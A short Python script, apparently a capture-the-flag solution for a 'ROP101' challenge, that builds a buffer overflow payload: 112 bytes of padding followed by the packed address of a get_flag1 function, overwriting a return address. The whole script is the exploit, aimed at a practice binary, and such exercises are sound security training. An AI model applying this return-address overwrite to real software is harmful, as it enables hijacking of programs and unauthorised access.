"""Get flag 1 of ROP101 - Basic buffer overflow to return to get_flag1
Author: Eugene Kolodenker <eugene@eugenekolo.com>
"""
import struct
import telnetlib

def p(x):
    return struct.pack('<L', x)

get_flag1 = 0x80488b9

# Flag 1
payload = ""
payload += "P"*112  # Add the padding leading to the overflow
payload += p(get_flag1)
print(payload)
